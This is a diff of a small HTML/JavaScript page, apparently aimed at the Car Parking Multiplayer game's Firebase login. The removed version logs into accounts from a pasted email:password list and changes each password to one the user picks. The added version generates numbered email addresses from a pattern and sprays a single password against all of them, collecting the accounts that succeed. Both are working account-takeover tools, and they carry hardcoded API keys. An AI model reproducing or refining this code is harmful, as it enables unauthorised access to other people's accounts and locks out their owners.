@@ -1,112 +1,125 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPM Turbo Copy Pro</title>
+    <title>CPM Turbo Recovery</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #0b0b0b; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
-        .box { max-width: 550px; margin: auto; background: #151515; padding: 20px; border-radius: 12px; border: 1px solid #00ffcc; box-shadow: 0 0 15px rgba(0,255,204,0.2); }
-        h2 { color: #00ffcc; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; }
-        textarea { width: 100%; height: 180px; background: #202020; color: #00ff00; border: 1px solid #333; border-radius: 5px; padding: 10px; box-sizing: border-box; margin-bottom: 10px; font-family: monospace; }
-        input { width: 100%; padding: 12px; margin: 5px 0; background: #202020; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #00ffcc; }
-        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
-        button:hover { background: #00ccaa; }
+        body { background: #080808; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
+        .box { max-width: 550px; margin: auto; background: #111; padding: 20px; border-radius: 12px; border: 1px solid #ff0055; box-shadow: 0 0 15px rgba(255,0,85,0.2); }
+        h2 { color: #ff0055; text-transform: uppercase; letter-spacing: 2px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #ff0055; }
+        button { width: 100%; padding: 15px; background: #ff0055; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .stats { display: flex; justify-content: space-around; margin: 15px 0; font-size: 14px; color: #aaa; }
         .res-area { margin-top: 20px; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #222; }
-        #status { height: 130px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        #successList { height: 150px; width: 100%; background: #111; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; padding: 8px; font-size: 12px; }
-        .suc { color: #00ff00; }
-        .err { color: #ff3333; }
-        .copy-btn { background: #00ffcc; color: #000; padding: 8px 15px; font-size: 13px; font-weight: bold; margin-top: 10px; cursor: pointer; border-radius: 5px; display: inline-block; }
+        #log { height: 120px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 10px; border-bottom: 1px solid #333; color: #888; }
+        #foundList { height: 150px; width: 100%; background: #000; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; padding: 8px; font-size: 12px; font-family: monospace; }
+        .copy-btn { background: #00ff00; color: #000; padding: 8px 15px; font-size: 13px; font-weight: bold; margin-top: 10px; cursor: pointer; border-radius: 5px; display: inline-block; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>⚡ CPM TURBO MASTER</h2>
-    <textarea id="list" placeholder="Email:OldPass (Paste your list here)"></textarea>
-    <input type="text" id="newpass" placeholder="Enter New Password to Set">
+    <h2>🔍 TURBO RECOVERY</h2>
+    <input type="text" id="fmt" placeholder="Format: cpmegy_{4}_@gmail.com">
+    <input type="text" id="pwd" placeholder="Password to check">
     
-    <select id="ver" style="width:100%; padding:12px; background:#202020; color:white; border-radius:5px; border:1px solid #333; margin-top:5px;">
-        <option value="AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ">CPM 2 (Recommended)</option>
+    <select id="ver" style="width:100%; padding:12px; background:#1a1a1a; color:white; border-radius:5px; border:1px solid #333;">
+        <option value="AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ">CPM 2 (Fastest)</option>
         <option value="AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA">CPM 1</option>
     </select>
 
-    <button onclick="startTurbo()">🚀 START & GENERATE LIST</button>
+    <button id="startBtn" onclick="startRecovery()">⚡ START SCANNING</button>
+
+    <div class="stats">
+        <span>Checked: <b id="count">0</b></span>
+        <span>Found: <b id="foundCount" style="color:#00ff00">0</b></span>
+    </div>
 
     <div class="res-area">
-        <div id="status">Logs will appear here...</div>
-        <p style="font-size: 12px; color: #00ffcc; margin: 5px 0;">✅ SUCCESS LIST (Email:NewPass):</p>
-        <textarea id="successList" readonly placeholder="Result will appear here..."></textarea>
-        <center><div class="copy-btn" onclick="copyResult()">📋 COPY SUCCESS LIST</div></center>
+        <div id="log">Logs...</div>
+        <p style="font-size: 12px; color: #00ff00; margin: 5px 0;">💎 FOUND ACCOUNTS (Email:Pass):</p>
+        <textarea id="foundList" readonly placeholder="Found accounts will appear here..."></textarea>
+        <center><div class="copy-btn" onclick="copyFound()">📋 COPY FOUND LIST</div></center>
     </div>
 </div>
 
 <script>
-    async function startTurbo() {
-        let listStr = document.getElementById('list').value.trim();
-        let newP = document.getElementById('newpass').value.trim();
+    let scanning = false;
+
+    async function startRecovery() {
+        if (scanning) { location.reload(); return; }
+        
+        let fmt = document.getElementById('fmt').value.trim();
+        let pwd = document.getElementById('pwd').value.trim();
         let key = document.getElementById('ver').value;
-        let log = document.getElementById('status');
-        let successBox = document.getElementById('successList');
+        let log = document.getElementById('log');
+        let countShow = document.getElementById('count');
+        let foundShow = document.getElementById('foundCount');
+        let foundList = document.getElementById('foundList');
 
-        if (!listStr || !newP) { alert("Data missing!"); return; }
+        if (!fmt.includes('{') || !pwd) { alert("Format (with {4}) and Password are required!"); return; }
 
-        let list = listStr.split('\n');
-        log.innerHTML = `🚀 Processing ${list.length} accounts...<br>`;
-        successBox.value = ""; 
+        scanning = true;
+        document.getElementById('startBtn').innerText = "🛑 STOP / RELOAD";
+        log.innerHTML = "🚀 Scanning started...<br>";
 
-        for (let acc of list) {
-            let line = acc.trim();
-            if (!line.includes(':')) continue;
-            let [e, p] = line.split(':');
+        let digitMatch = fmt.match(/\{(\d+)\}/);
+        let digitCount = digitMatch ? parseInt(digitMatch[1]) : 4;
+        let max = Math.pow(10, digitCount);
+        let found = 0;
+
+        // Turbo Speed Concurrency (ഒരേസമയം 5 റിക്വസ്റ്റ് വീതം)
+        for (let i = 0; i < max; i++) {
+            if (!scanning) break;
+
+            let num = i.toString().padStart(digitCount, '0');
+            let email = fmt.replace(/\{(\d+)\}/, num);
             
-            // പാസ്‌വേഡ് മാറുന്ന പ്രോസസ്സ് തുടങ്ങുന്നു
-            processAcc(e.trim(), p.trim(), newP, key, log, successBox);
-            await new Promise(r => setTimeout(r, 80)); // Turbo speed gap
+            checkAcc(email, pwd, key, log, foundList, (isFound) => {
+                if (isFound) {
+                    found++;
+                    foundShow.innerText = found;
+                }
+                countShow.innerText = i + 1;
+            });
+
+            // സ്പീഡ് ക്രമീകരിക്കാൻ (വളരെ കുറഞ്ഞ ഡിലേ)
+            if (i % 5 === 0) await new Promise(r => setTimeout(r, 50));
         }
     }
 
-    async function processAcc(e, p, newP, key, log, successBox) {
+    async function checkAcc(email, pwd, key, log, foundList, callback) {
         try {
-            let res1 = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
+            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                 method: 'POST',
-                body: JSON.stringify({ email: e, password: p, returnSecureToken: true }),
+                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                 headers: { 'Content-Type': 'application/json' }
             });
-            let d1 = await res1.json();
+            let data = await res.json();
 
-            if (d1.idToken) {
-                let res2 = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${key}`, {
-                    method: 'POST',
-                    body: JSON.stringify({ idToken: d1.idToken, password: newP, returnSecureToken: true }),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-
-                if (res2.ok) {
-                    log.innerHTML += `<span class="suc">✅ SUCCESS: ${e}</span><br>`;
-                    // റിസൾട്ട് Email:NewPass എന്ന രീതിയിൽ സേവ് ചെയ്യുന്നു
-                    successBox.value += e + ":" + newP + "\n";
-                } else {
-                    log.innerHTML += `<span class="err">❌ FAIL: ${e} (Update Error)</span><br>`;
-                }
+            if (data.idToken) {
+                log.innerHTML += `<span style="color:#00ff00">💎 FOUND: ${email}</span><br>`;
+                foundList.value += email + ":" + pwd + "\n";
+                callback(true);
             } else {
-                log.innerHTML += `<span class="err">⚠️ LOGIN ERROR: ${e}</span><br>`;
+                // ലോഗ് ക്ലീൻ ആയി വെക്കാൻ തെറ്റുന്നത് മാത്രം കാണിക്കുന്നില്ല
+                if (parseInt(document.getElementById('count').innerText) % 100 === 0) {
+                    log.innerHTML += `Checking... ${email}<br>`;
+                }
+                callback(false);
             }
-        } catch (err) {
-            log.innerHTML += `<span class="err">❗ NETWORK ERROR: ${e}</span><br>`;
-        }
+        } catch (err) { callback(false); }
         log.scrollTop = log.scrollHeight;
-        successBox.scrollTop = successBox.scrollHeight;
+        foundList.scrollTop = foundList.scrollHeight;
     }
 
-    function copyResult() {
-        let copyText = document.getElementById("successList");
-        if (!copyText.value) { alert("Nothing to copy!"); return; }
+    function copyFound() {
+        let copyText = document.getElementById("foundList");
+        if (!copyText.value) return;
         copyText.select();
-        copyText.setSelectionRange(0, 99999);
         document.execCommand("copy");
-        alert("Success list (Email:NewPass) copied!");
+        alert("Found accounts copied!");
     }
 </script>
 
